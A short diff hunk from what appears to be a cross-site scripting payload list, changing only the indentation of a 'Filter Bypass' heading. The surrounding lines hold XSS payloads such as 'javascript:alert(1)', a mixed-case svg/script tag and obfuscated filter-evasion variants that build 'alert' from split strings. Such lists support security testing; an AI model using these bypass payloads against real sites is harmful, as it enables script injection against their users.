@@ -30,7 +30,7 @@ javascript:alert(1)
 <sVg><scRipt >alert&lpar;1&rpar; {Opera}
 
 
-***Filter Bypass***
+                                                                 ***Filter Bypass***
 
 self[`aler`%2b`t`]`1`
 'new Function`al\ert\`1\``'
